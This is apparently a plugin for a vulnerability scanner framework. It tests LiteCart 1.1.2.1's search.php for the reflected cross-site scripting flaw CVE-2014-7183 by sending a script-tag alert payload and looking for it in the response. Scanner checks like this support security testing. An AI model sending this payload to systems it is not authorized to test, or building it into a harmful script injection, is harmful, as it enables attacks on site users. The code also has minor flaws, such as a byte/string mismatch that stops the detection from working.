# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'LiteCart_0000'  # 平台漏洞编号，留空
    name = 'LiteCart 1.1.2.1 /search.php 跨站脚本漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''
        LiteCart发现的几个跨站点脚本漏洞,一个允许你创建电子商务网站的开源项目。
    '''  # 漏洞描述
    ref = 'https://www.netsparker.com/web-applications-advisories/xss-vulnerabilities-in-litecart/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-7183'  # cve编号
    product = 'LiteCart'  # 漏洞应用名称
    product_version = '1.1.2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f4c48719-5106-433e-9241-6a013127f8b4'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '''/search.php?query='"--></style></scRipt><scRipt>alert(0x0000C0)</scRipt>'''
            verify_url = '{target}'.format(target=self.target)+payload

            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<scRipt>alert(0x0000C0)</scRipt>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
